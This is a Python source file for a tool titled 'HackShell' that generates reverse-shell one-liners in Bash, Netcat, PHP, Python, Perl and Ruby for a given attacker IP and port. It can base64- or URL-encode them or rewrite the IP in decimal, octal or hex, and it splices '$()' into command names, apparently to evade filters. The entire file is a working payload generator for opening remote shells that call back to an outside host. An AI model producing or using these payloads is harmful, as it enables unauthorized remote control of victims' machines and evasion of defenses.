import sys
import urllib.parse
import base64
import struct
import socket

def menu():
    return print(""".------..------..------..------..------..------..------..------..------.
|H.--. ||A.--. ||C.--. ||K.--. ||S.--. ||H.--. ||E.--. ||L.--. ||L.--. |
| :/\: || (\/) || :/\: || :/\: || :/\: || :/\: || (\/) || :/\: || :/\: |
| (__) || :\/: || :\/: || :\/: || :\/: || (__) || :\/: || (__) || (__) |
| '--'H|| '--'A|| '--'C|| '--'K|| '--'S|| '--'H|| '--'E|| '--'L|| '--'L|
`------'`------'`------'`------'`------'`------'`------'`------'`------'
\n1- Reverse Shells\n[a - Bash | b - NetCat | c - PHP | d - Python | e - Perl | f - Ruby] [IP] [Port] [Encode(d, b64, urle, int, octa, hex)]\n \nex: hackshell 1a ip port long\n\n2-Tricks - Privesc\n[a] list all\n""")

def ReverseShellBash(ip, port, encode):
    rsba = ''.join(("\nba$()sh -$()i >& /dev/tcp/"+ip+"/"+port," 0>&1"))
    message_bytes = rsba.encode('ascii')
    if encode == 'd':
        print(rsba)
    elif encode == 'b64':
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        print('\n'+base64_message)
    elif encode == 'urle':
        urlencode = urllib.parse.quote(message_bytes)
        print('\n'+urlencode)
    elif encode == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rsba2 = ''.join(("\nba$()sh -$()i >& /dev/tcp/"+str(ip2)+"/"+port," 0>&1"))
        print(rsba2)
    elif encode == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsba2 = ''.join(("\nba$()sh -$()i >& /dev/tcp/"+str(ip2)+"/"+port," 0>&1"))
        print(rsba2)
    elif encode == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsba2 = ''.join(("\nba$()sh -$()i >& /dev/tcp/"+str(ip2)+"/"+port," 0>&1"))
        print(rsba2)

def ReverseShellNetcat(ip, port, encode):
    rsnc = ''.join(("\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|n$()c "+ip+" "+port, " >/tmp/f"))
    message_bytes = rsnc.encode('ascii')
    if encode == 'd':
        print(rsnc)
    elif encode == 'b64':
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        print('\n'+base64_message)
    elif encode =='urle':
        urlencode = urllib.parse.quote(message_bytes)
        print('\n'+urlencode)
    elif encode == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsnc2 = ''.join(("\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|n$()c "+str(ip2)+" "+port, " >/tmp/f"))
        print(rsnc2)
    elif encode == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsnc2 = ''.join(("\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|n$()c "+str(ip2)+" "+port, " >/tmp/f"))
        print(rsnc2)

def ReverseShellPhp(ip, port,encode):
    rsph = ''.join(("\nph$()p -$()r '$sock=fsockopen("+"\""+ ip +"\"" +"," + port, ');exec("/bin/sh -i <&3 >&3 2>&3");\''))
    message_bytes = rsph.encode('ascii')
    if encode == 'd':
        print(rsph)
    elif encode == 'b64':
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        print('\n'+base64_message)
    elif encode =='urle':
        urlencode = urllib.parse.quote(message_bytes)
        print('\n'+urlencode)
    elif encode == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rsph2 = ''.join(("\nph$()p -$()r '$sock=fsockopen("+"\""+ str(ip2) +"\"" +"," + port, ');exec("/bin/sh -i <&3 >&3 2>&3");\''))
        print(rsph2)
    elif encode == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsph2 = ''.join(("\nph$()p -$()r '$sock=fsockopen("+"\""+ str(ip2) +"\"" +"," + port, ');exec("/bin/sh -i <&3 >&3 2>&3");\''))
        print(rsph2)
    elif encode == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsph2 = ''.join(("\nph$()p -$()r '$sock=fsockopen("+"\""+ str(ip2) +"\"" +"," + port, ');exec("/bin/sh -i <&3 >&3 2>&3");\''))
        print(rsph2)

def ReverseShellPython(ip, port,encode):
    rspy = ''.join(("\npy$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+'"'+ip+'"'","+ port +"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
    message_bytes = rspy.encode('ascii')
    if encode == 'd':
        print(rspy)
    elif encode == 'b64':
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        print('\n'+base64_message)
    elif encode == 'urle':
        urlencode = urllib.parse.quote(message_bytes)
        print('\n'+urlencode)
    elif encode == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rspy2 = ''.join(("\npy$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+'"'+str(ip2)+'"'","+ port +"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
        print(rspy2)
    elif encode == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rspy2 = ''.join(("\npy$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+'"'+str(ip2)+'"'","+ port +"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
        print(rspy2)
    elif encode == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rspy2 = ''.join(("\npy$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+'"'+str(ip2)+'"'","+ port +"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
        print(rspy2)

def ReverseShellPerl(ip, port,encode):
    rspe = ''.join(("\npe$()rl -$()e 'use Socket;$i="+'"'+ ip+'"'+ ";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))
    message_bytes = rspe.encode('ascii')
    if encode == "d":
        print(rspe)
    elif encode == 'b64':
        message_bytes = rspe.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        print('\n'+base64_message)
    elif encode =='urle':
        urlencode = urllib.parse.quote(message_bytes)
        print('\n'+urlencode)
    elif encode == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rspe2 = ''.join(("\npe$()rl -$()e 'use Socket;$i=" +'"'+ str(ip2)+'"'+ ";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))
        print(rspe2)
    elif encode == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rspe2 = ''.join(("\npe$()rl -$()e 'use Socket;$i=" +'"'+ str(ip2)+'"'+ ";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))
        print(rspe2)
    elif encode == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rspe2 = ''.join(("\npe$()rl -$()e 'use Socket;$i=" +'"'+ str(ip2)+'"'+ ";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))
        print(rspe2)

def ReverseShellRuby(ip, port,encode):
    rsr = ''.join(("\nru$()by -rsocket -$()e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new("'"'+ip+'"'","+port+"))'"))
    message_bytes = rsr.encode('ascii')
    if encode == "d":
        print(rsr)
    elif encode == 'b64':
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        print('\n'+base64_message)
    elif encode == 'urle':
        urlencode = urllib.parse.quote(message_bytes)
        print('\n'+urlencode)
    elif encode == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rsr2 = ''.join(("\nru$()by -rsocket -$()e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new("'"'+str(ip2)+'"'+ "," + port + "))'"))
        print(rsr2)
    elif encode == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsr2 = ''.join(("\nru$()by -rsocket -$()e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new("'"'+str(ip2)+'"'+ "," + port + "))'"))
        print(rsr2)
    elif encode == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsr2 = ''.join(("\nr$()by -rsocket -$()e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new("'"'+str(ip2)+'"'+ "," + port + "))'"))
        print(rsr2)

menu()
try:
    if sys.argv[1] == "1a":
        ReverseShellBash(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1] == "1b":
        ReverseShellNetcat(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1] == "1c":
        ReverseShellPhp(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1] == "1d":
        ReverseShellPython(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1] == "1e":
        ReverseShellPerl(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1] == "1f":
        ReverseShellRuby(sys.argv[2], sys.argv[3], sys.argv[4])
except:
    print("Some parameter is missing...")
